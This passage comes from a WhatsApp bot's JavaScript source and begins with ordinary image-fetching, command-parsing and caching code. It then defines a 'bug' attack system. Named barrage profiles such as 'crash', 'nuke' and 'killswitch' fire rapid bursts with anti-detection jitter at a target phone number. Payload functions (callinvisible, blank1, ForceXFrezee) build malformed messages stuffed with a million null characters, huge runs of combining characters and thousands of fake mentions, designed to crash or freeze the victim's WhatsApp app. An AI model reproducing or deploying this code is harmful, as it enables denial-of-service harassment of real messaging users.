        ngif: 'ngif', gecg: 'gecg',
    };

    // ── Try Tier 1 ──
    const t1Cat = nekosBestMap[lc] || (lc === 'waifu' ? 'waifu' : null);
    if (t1Cat) {
        const u = await _animeTryJson('https://nekos.best/api/v2/' + t1Cat + '?amount=1');
        if (u) return u;
    }

    // ── Try Tier 2 (nekos.life) ──
    const t2Cat = nekosLifeMap[lc] || (t1Cat ? null : 'waifu');
    if (t2Cat) {
        const u = await _animeTryJson('https://nekos.life/api/v2/img/' + t2Cat);
        if (u) return u;
    }

    // ── Final fallback: generic waifu on either API ──
    for (const fb of [
        'https://nekos.best/api/v2/waifu?amount=1',
        'https://nekos.life/api/v2/img/waifu',
        'https://nekos.life/api/v2/img/neko',
    ]) {
        const u = await _animeTryJson(fb);
        if (u) return u;
    }

    // ── Tier 3: pic.re — direct image URL, always returns 200 with binary ──
    // getBuffer() will fetch the binary; no JSON extraction needed.
    return 'https://pic.re/image';
}
// ─────────────────────────────────────────────────────────────────────────────
// ─────────────────────────────────────────────────────────────────────────────


// Newsletter configuration
const NEWSLETTER_JID = '120363408022768294@newsletter';
const NEWSLETTER_NAME = "© CYBER by GAME CHANGER";

const addNewsletterContext = (messageContent) => {
  if (messageContent.contextInfo) {
    return {
      ...messageContent,
      contextInfo: {
        ...messageContent.contextInfo,
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: NEWSLETTER_JID,
          newsletterName: NEWSLETTER_NAME,
          serverMessageId: -1
        }
      }
    };
  }
  return {
    ...messageContent,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: NEWSLETTER_JID,
        newsletterName: NEWSLETTER_NAME,
        serverMessageId: -1
      }
    }
  };
};

const replyWithNewsletter = async (jid, text, quotedMsg, mentions = []) => {
  try {
    // Channels/newsletters: NO quoted context — newsletters don't support it
    if (jid && jid.endsWith('@newsletter')) {
      await devtrust.sendMessage(jid, { text: text, mentions: mentions });
      return;
    }
    await devtrust.sendMessage(jid,
      addNewsletterContext({
        text: text,
        mentions: mentions
      }),
      { quoted: quotedMsg }
    );
  } catch (error) {
    console.error('Reply with newsletter error:', error);
    // Fallback: plain send, no quoted
    await devtrust.sendMessage(jid, { text: text, mentions: mentions }).catch(()=>{});
  }
};

const reply = async (text, mentions = []) => {
  try {
    if (m.chat?.endsWith('@newsletter')) {
      return await devtrust.sendMessage(m.chat, { text, mentions }, { priority: true });
    }
    return await devtrust.sendMessage(
      m.chat,
      addNewsletterContext({ text, mentions }),
      { quoted: m, priority: true }
    );
  } catch (error) {
    console.error('Reply failed:', error);
    try {
      return await devtrust.sendMessage(m.chat, { text, mentions }, { priority: true });
    } catch (_) {
      return null;
    }
  }
};

// ======================[ FIXED COMMAND DETECTION ]======================
let body = (
    m.mtype === "conversation" ? m.message?.conversation :
    m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :
    m.mtype === "imageMessage" ? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage" ? m.message?.videoMessage?.caption :
    m.mtype === "documentMessage" ? m.message?.documentMessage?.caption || "" :
    m.mtype === "audioMessage" ? m.message?.audioMessage?.caption || "" :
    m.mtype === "stickerMessage" ? m.message?.stickerMessage?.caption || "" :
    m.mtype === "buttonsResponseMessage" ? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson).id :
    m.mtype === "messageContextInfo" ? m.message?.buttonsResponseMessage?.selectedButtonId ||
    m.message?.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message?.reactionMessage?.text :
    m.mtype === "contactMessage" ? m.message?.contactMessage?.displayName :
    m.mtype === "contactsArrayMessage" ? m.message?.contactsArrayMessage?.contacts?.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message?.locationMessage?.degreesLatitude}, ${m.message?.locationMessage?.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message?.liveLocationMessage?.degreesLatitude}, ${m.message?.liveLocationMessage?.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message?.pollCreationMessage?.name :
    m.mtype === "pollUpdateMessage" ? m.message?.pollUpdateMessage?.name :
    m.mtype === "groupInviteMessage" ? m.message?.groupInviteMessage?.groupJid :
    m.mtype === "viewOnceMessage" ? (m.message?.viewOnceMessage?.message?.imageMessage?.caption ||
                                     m.message?.viewOnceMessage?.message?.videoMessage?.caption ||
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message?.viewOnceMessageV2?.message?.imageMessage?.caption ||
                                       m.message?.viewOnceMessageV2?.message?.videoMessage?.caption ||
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message?.viewOnceMessageV2Extension?.message?.imageMessage?.caption ||
                                                m.message?.viewOnceMessageV2Extension?.message?.videoMessage?.caption ||
                                                "[Pesan sekali lihat]") :
    m.mtype === "ephemeralMessage" ? (m.message?.ephemeralMessage?.message?.conversation ||
                                      m.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
                                      "[Pesan sementara]") :
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
    m.body || ""  // ultimate fallback for any unrecognized message type
);
if (typeof body !== 'string') {
    body = typeof m.body === 'string' ? m.body
        : typeof m.text === 'string' ? m.text
        : '';
}
if (body === '[object Object]') {
    body = typeof m.body === 'string' ? m.body
        : typeof m.text === 'string' ? m.text
        : '';
}

// ============ COMMAND DETECTION (PER-USER PREFIX) ============
// PERF FIX: cache owner/premium in memory — avoids 2x sync disk reads on every message
if (!global._ownerCache) { try { global._ownerCache = JSON.parse(fs.readFileSync('./allfunc/owner.json')); } catch(_e) { global._ownerCache = []; } }
if (!global._premiumCache) { try { global._premiumCache = JSON.parse(fs.readFileSync('./allfunc/premium.json')); } catch(_e) { global._premiumCache = []; } }
const owner = global._ownerCache;
const Premium = global._premiumCache;
const ownerNumber = owner[0] || "254700000000";

// Get user-specific prefix from the new system
let prefix = getUserPrefix(m.sender);

// STRICT command detection - ONLY detect if message STARTS WITH user's prefix
const isCmd = body && typeof body === 'string' && body.startsWith(prefix);

let command = '';
let args = [];
let text = '';

if (isCmd) {
    // Extract command ONLY if it starts with user's prefix
    const afterPrefix = body.slice(prefix.length).trim();
    const parts = afterPrefix.split(/ +/);
    command = parts[0].toLowerCase();
    args = parts.slice(1);
    text = args.join(' ');
}

// ⚡ Sub-1s turbo path — skip ~4000 lines of per-message setup for hot commands
if (isCmd && command) {
    try {
        const { isTurboCommand, tryTurboCommand } = require('./allfunc/turbo-cmd');
        if (isTurboCommand(command)) {
            if (!devtrust._cachedBotNumber) {
                devtrust._cachedBotNumber = devtrust.decodeJid(devtrust.user.id);
            }
            const _turboJidNum = (j) => String(j || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
            const _turboBot = _turboJidNum(devtrust._cachedBotNumber);
            const _turboSender = _turboJidNum(m.sender);
            const _turboLinked = Boolean(m.key?.fromMe || (_turboSender && _turboSender === _turboBot));
            const _turboCreator = [devtrust._cachedBotNumber, ...(Array.isArray(owner) ? owner : [])].some((v) => _turboJidNum(v) === _turboSender) || Boolean(m.key?.fromMe);
            // Private mode: linked user OR owner only — same rule as full command path
            if (!devtrust.public && !_turboLinked && !_turboCreator && !m.key?.fromMe) return;
            ensureFlagCache();
            if (Date.now() - (global._flagCache.ts || 0) > 30 * 60 * 1000) {
                try {
                    global._flagCache.botDisabled = fs.existsSync('./database/bot_disabled.json')
                        ? JSON.parse(fs.readFileSync('./database/bot_disabled.json', 'utf8')) : [];
                } catch (_) { global._flagCache.botDisabled = []; }
                global._flagCache.ts = Date.now();
            }
            if (global._flagCache.botDisabled.some((id) => String(id).replace(/[^0-9]/g, '') === _turboBot)) return;
            const handled = await tryTurboCommand(devtrust, m, {
                command,
                prefix,
                pushname: m.pushName || 'User',
                botMode: devtrust.public ? 'PUBLIC' : 'PRIVATE',
                totalCommands: global._cachedCommandCount,
            });
            if (handled) return;
        }
    } catch (_turboErr) {
        console.error('[turbo-cmd]', _turboErr?.message);
    }
}

// VIEW-ONCE EMOJI TRIGGER: Allow emoji replies/reactions WITHOUT prefix
// These emojis trigger view-once pic/video download when replied to a view-once message
if (!command && body && m.quoted) {
    // SPEED: module-level constant — created ONCE, not on every message
    if (!global._voEmojisSet) global._voEmojisSet = new Set([
        '😭','🌚','🤭','🔥','😋','😊','😘','😎','😅','✨','⭐',
        '🫡','🥺','😁','😐','🙃','🤣','😂','😕','💓','❤️','✅',
        '😝','🫪','🤔','💀','☠️','⚡','💫','🤍','🩵','💙','💝',
        '💖','💗','💞','💕',
        '❤','🫶','👍','🙌','😍','🤩','💯',
        '🎉','🔮','💎','🌟','💥','🎯','🏆','👑','🦋'
    ]);
    const _voEmojis = global._voEmojisSet;
    const _trimBody = (body || '').trim();
    if (_voEmojis.has(_trimBody)) {
        command = _trimBody;
    }
}


const qtext = args.join(" ");
const q = args.join(" ");
const tempMailData = {};
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const sender = (m.isGroup || m.isNewsletter) ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid;
const userMovieSessions = {};
// ── Cache botNumber per-connection (unchanged until reconnect) ──
if (!devtrust._cachedBotNumber) {
  devtrust._cachedBotNumber = devtrust.decodeJid(devtrust.user.id);
}
const botNumber = devtrust._cachedBotNumber;

// ── EARLY delete protocol — before flagCache/command switch (prevents .some() crash + spam errors)
const _earlyDelProto = m.message?.protocolMessage;
if ((_earlyDelProto?.type === 0 || _earlyDelProto?.type === 5) && _earlyDelProto?.key?.id) {
    try {
        const _adBotNumEarly = jidToNum(getBotJid(devtrust));
        const _adCfgEarly = loadAntideleteCfg(_adBotNumEarly);
        if ((_adCfgEarly.mode || 'off') !== 'off') {
            const _adChatEarly = m.key?.remoteJid || _earlyDelProto.key?.remoteJid || '';
            const _adDelByEarly = m.key?.participant || _earlyDelProto.key?.participant || m.key?.remoteJid || '';
            if (typeof global._adHandleMessageDelete === 'function') {
                await global._adHandleMessageDelete(devtrust, {
                    botNum: _adBotNumEarly,
                    chatId: _adChatEarly,
                    msgId: _earlyDelProto.key.id,
                    deletedBy: _adDelByEarly,
                    fromMeDelete: Boolean(m.key?.fromMe),
                    altChatIds: typeof global._adChatIdsFromKey === 'function'
                        ? global._adChatIdsFromKey(m.key || _earlyDelProto.key || {})
                        : [],
                });
            }
        }
    } catch (e) { console.error('[ANTIDELETE-EARLY]', e?.message || e); }
    return;
}

// Linked WhatsApp account user (paired number) — used for self/private mode
const _botNumClean = String(botNumber || '').replace(/[^0-9]/g, '');
if (!global._attackState) global._attackState = {};
if (!global._attackState[_botNumClean]) global._attackState[_botNumClean] = { stopAttacks: false, stealthMode: false };
const _atk = global._attackState[_botNumClean];
const _isBotLinkedUser = () => {
    const senderNum = String(m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
    return Boolean(m.key?.fromMe || (senderNum && senderNum === _botNumClean));
};

// ── Cache groupMetadata with 30-min TTL + pending-request dedup ──
// PERF FIX: TTL 5min→30min (group admins rarely change).
// Dedup: if a fetch is already in-flight for this JID, await the same promise
// instead of sending a second concurrent WA API request.
if (!global._groupMetaCache) global._groupMetaCache = new Map();
if (!global._groupMetaPending) global._groupMetaPending = new Map();
let groupMetadata = null;
let participants = [];
let groupAdmins = m.isNewsletter ? [botNumber, m.sender] : [];
let _groupContextLoaded = false;

async function ensureGroupContext() {
  if (_groupContextLoaded || !m.isGroup) return;
  _groupContextLoaded = true;
  const _gmc = global._groupMetaCache.get(from);
  if (_gmc && (Date.now() - _gmc.ts) < 30 * 60 * 1000) {
    groupMetadata = _gmc.data;
  } else if (global._groupMetaPending.has(from)) {
    groupMetadata = await global._groupMetaPending.get(from).catch(() => null);
  } else {
    const _fetchPromise = devtrust.groupMetadata(from).catch(() => null);
    global._groupMetaPending.set(from, _fetchPromise);
    groupMetadata = await _fetchPromise;
    global._groupMetaPending.delete(from);
    if (groupMetadata) global._groupMetaCache.set(from, { data: groupMetadata, ts: Date.now() });
  }
  participants = groupMetadata?.participants || [];
  groupAdmins = await getGroupAdmins(participants);
  _syncGroupFlags();
}

// ── Per-message flag cache (5min TTL) — all DB list reads cached here ──
ensureFlagCache();
const _flagNow = Date.now();
if (_flagNow - global._flagCache.ts > 30 * 60 * 1000) { // SPEED: 15min→30min (halves disk read frequency)
    const _p = path; // already required at top — no extra require() needed
    try { const _bdf = './database/bot_disabled.json';
        global._flagCache.botDisabled = fs.existsSync(_bdf) ? JSON.parse(fs.readFileSync(_bdf, 'utf8')) : []; } catch(e) { global._flagCache.botDisabled = []; }
    try { const _auf = _p.join(__dirname, 'database', 'adult_unlocked.json');
        global._flagCache.adult = fs.existsSync(_auf) ? JSON.parse(fs.readFileSync(_auf, 'utf-8')) : [];
        global._flagCache.adultUnlocked = global._flagCache.adult; } catch(e) { global._flagCache.adult = []; global._flagCache.adultUnlocked = []; }
    try { const _abf = './database/adult_banned.json';
        global._flagCache.adultBanned = fs.existsSync(_abf) ? JSON.parse(fs.readFileSync(_abf, 'utf-8')) : []; } catch(e) { global._flagCache.adultBanned = []; }
    try { const _buf = _p.join(__dirname, 'database', 'bug_unlocked.json');
        global._flagCache.bug = fs.existsSync(_buf) ? JSON.parse(fs.readFileSync(_buf, 'utf-8')) : [];
        global._flagCache.bugUnlocked = global._flagCache.bug; } catch(e) { global._flagCache.bug = []; global._flagCache.bugUnlocked = []; }
    try { const _bbf = './database/bug_banned.json';
        global._flagCache.bugBanned = fs.existsSync(_bbf) ? JSON.parse(fs.readFileSync(_bbf, 'utf-8')) : []; } catch(e) { global._flagCache.bugBanned = []; }
    try { const _akbf = _p.join(__dirname, 'database', 'ak_banned.json');
        global._flagCache.akBanned = fs.existsSync(_akbf) ? JSON.parse(fs.readFileSync(_akbf, 'utf-8')) : []; } catch(e) { global._flagCache.akBanned = []; }
    try { const _akuf = _p.join(__dirname, 'database', 'ak_unlocked.json');
        global._flagCache.akUnlocked = fs.existsSync(_akuf) ? JSON.parse(fs.readFileSync(_akuf, 'utf-8')) : []; } catch(e) { global._flagCache.akUnlocked = []; }
    try { const _aksf = _p.join(__dirname, 'database', 'ak_secret.json');
        global._flagCache.akSecret = fs.existsSync(_aksf) ? (JSON.parse(fs.readFileSync(_aksf, 'utf-8')).code || '') : ''; } catch(e) { global._flagCache.akSecret = ''; }
    global._flagCache.ts = _flagNow;
}

// ── Bot disable check (admin panel → database/bot_disabled.json) ──
const _cleanBotNum = botNumber.replace(/[^0-9]/g, '');
const _botDisabled = global._flagCache.botDisabled.some(id => String(id).replace(/[^0-9]/g, '') === _cleanBotNum || String(id) === botNumber);
if (_botDisabled) return;

const _jidNum = (j) => String(j || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
const _senderNum = _jidNum(m.sender);
const _ownerList = Array.isArray(owner) ? owner : [];
const _premiumList = Array.isArray(Premium) ? Premium : [];
const isCreator = [botNumber, ..._ownerList].some((v) => _jidNum(v) === _senderNum) || Boolean(m.key?.fromMe);
const isDev = _ownerList.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
const isOwner = isCreator;
const isPremium = [botNumber, ..._premiumList].some((v) => _jidNum(v) === _senderNum) || Boolean(m.key?.fromMe);
const _cmdFastPath = Boolean(isCmd && (_isBotLinkedUser() || isCreator || m.key?.fromMe));
const isSudo = loadSudoList().includes(m.sender);
// 18+ unlock status for this sender (cached)
const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
// Bug & SIM Database unlock status for this sender (cached)
const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);

// Shared bug-section access guard — used by all bug attack commands
const _requireBugAccess = () => {
    if (global._flagCache.bugBanned.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
        reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
        return false;
    }
    if (!global._flagCache.bugUnlocked.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
        reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
        return false;
    }
    return true;
};

// Parse + validate bug target number
const _parseBugTarget = (raw) => {
    const num = String(raw || '').replace(/[^0-9]/g, '');
    if (!num || num.length < 7 || num.length > 15) return null;
    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ''));
    if (protectedNumbers.includes(num)) return { blocked: true, num };
    return { num, jid: num + '@s.whatsapp.net' };
};

// Silent error wrapper — one failed payload never kills the barrage
const _bugSafe = async (fn, target) => {
    try { await fn(target); } catch (_) {}
};

// Parallel burst with anti-detect micro-jitter between batches
const _bugBurst = async (target, fns, batchSize = 8) => {
    if (_atk.stopAttacks) return;
    for (let i = 0; i < fns.length; i += batchSize) {
        if (_atk.stopAttacks) return;
        await Promise.allSettled(
            fns.slice(i, i + batchSize).map(fn => _bugSafe(fn, target))
        );
        await sleep(12 + Math.floor(Math.random() * 28));
    }
};

// Centralized attack profiles — all bug commands route through here
const _runBugBarrage = async (target, profile = 'standard') => {
    const _carousel = (t) => CarouselVY4(devtrust, t);
    const _crashIos = (t) => CrashLoadIos(devtrust, t);

    const waves = {
        combo: () => _bugBurst(target,
            Array(36).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 9),
        fcnew: () => _bugBurst(target,
            Array(30).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 8),
        xphone: () => _bugBurst(target,
            Array(24).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 8),
        bayu: () => _bugBurst(target,
            Array(24).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 8),
        forceclose: () => _bugBurst(target, Array(40).fill(forclose), 12),
        ios: () => _bugBurst(target,
            Array(20).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 8),
        vampire: () => _bugBurst(target, Array(6).fill(VampireBugIns), 3),
        group: () => _bugBurst(target, Array(8).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 4),
    };

    const profiles = {
        crash:     { rounds: 14, seq: ['combo', 'fcnew', 'forceclose', 'xphone'] },
        delayhard: { rounds: 18, seq: ['fcnew', 'fcnew', 'combo', 'xphone', 'bayu', 'forceclose'] },
        close:     { rounds: 12, seq: ['combo', 'fcnew', 'forceclose', 'forceclose', 'xphone'] },
        invis:     { rounds: 20, seq: ['ios', 'combo', 'forceclose'] },
        ultrabug:  { rounds: 28, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'vampire'] },
        megabug:   { rounds: 35, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose'] },
        ghost:     { rounds: 35, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'ios'] },
        godmode:   { rounds: 45, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
        killswitch:{ rounds: 50, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
        nuke:      { rounds: 55, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'xphone', 'bayu', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
        destroy:   { rounds: 16, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
        standard:  { rounds: 12, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
        group:     { rounds: 22, seq: ['group', 'combo', 'fcnew', 'forceclose'] },
    };

    const cfg = profiles[profile] || profiles.standard;
    for (let round = 0; round < cfg.rounds; round++) {
        if (_atk.stopAttacks) { _atk.stopAttacks = false; break; }
        await Promise.allSettled(
            cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
        );
        await sleep(8 + Math.floor(Math.random() * 22));
    }
};
let isBotAdmins = m.isNewsletter ? true : false;
let isAdmins = m.isNewsletter ? true : false;
let groupName = '';

function _syncGroupFlags() {
  if (!m.isGroup) return;
  isBotAdmins = groupAdmins.includes(botNumber);
  isAdmins = groupAdmins.includes(m.sender);
  groupName = groupMetadata?.subject || '';
}


const pushname = m.pushName || "No Name";
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

// ============ STICKER HELPER FUNCTIONS ============
async function sendImageAsSticker(chatId, media, quoted, options = {}) {
    try {
        const sticker = new Sticker(media, {
            pack: options.packname || global.packname || "CYBER",
            author: options.author || global.author || "GAME CHANGER",
            type: StickerTypes.FULL,
            quality: 80,
            background: '#00000000'
        });
        const stickerBuffer = await sticker.toBuffer();
        await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
        return true;
    } catch (error) {
        console.error('Image sticker error:', error);
        throw error;
    }
}

async function sendVideoAsSticker(chatId, media, quoted, options = {}) {
    try {
        const sticker = new Sticker(media, {
            pack: options.packname || global.packname || "CYBER",
            author: options.author || global.author || "GAME CHANGER",
            type: StickerTypes.FULL,
            quality: 50,
            background: '#00000000'
        });
        const stickerBuffer = await sticker.toBuffer();
        await devtrust.sendMessage(chatId, { sticker: stickerBuffer }, { quoted });
        return true;
    } catch (error) {
        console.error('Video sticker error:', error);
        throw error;
    }
}

// ============ STYLETEXT FUNCTION ============
async function styletext(text) {
    return [
        { name: 'Normal', result: text },
        { name: 'Bold', result: '**' + text + '**' },
        { name: 'Italic', result: '*' + text + '*' },
        { name: 'Strikethrough', result: '~' + text + '~' },
        { name: 'Monospace', result: '```' + text + '```' }
    ];
}

// ============ RANDOM COLOR FUNCTION ============
function randomColor() {
    const colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white', 'greenBright', 'yellowBright'];
    const colorIndex = Math.floor(Math.random() * colors.length);
    const colorName = colors[colorIndex];
    
    // Return chalk color function
    switch(colorName) {
        case 'red': return chalk.red;
        case 'green': return chalk.green;
        case 'yellow': return chalk.yellow;
        case 'blue': return chalk.blue;
        case 'magenta': return chalk.magenta;
        case 'cyan': return chalk.cyan;
        case 'white': return chalk.white;
        case 'greenBright': return chalk.greenBright;
        case 'yellowBright': return chalk.yellowBright;
        default: return chalk.white;
    }
}
// ==================================================

async function callinvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Danzz Bjir",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await devtrust.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function blank1(target) {
 try {
  const anta = 'ោ៝'.repeat(20000);
  const nyocot = 'ꦾ'.repeat(20000);
  const msg = {

      newsletterAdminInviteMessage: {
      newsletterJid: "1234567891234@newsletter",
      newsletterName: "sv Danzz ya bang" + "ោ៝".repeat(20000),
      caption: "Halo" + anta + nyocot + "ោ៝".repeat(20000),
      inviteExpiration: "90000",
      contextInfo: {
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await devtrust.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}

async function ForceXFrezee(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await devtrust.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "CYBER Destroyed" + "ꦾ".repeat(77777),
      publisher: "GAME CHANGER",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "💦💦💦💦😖" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
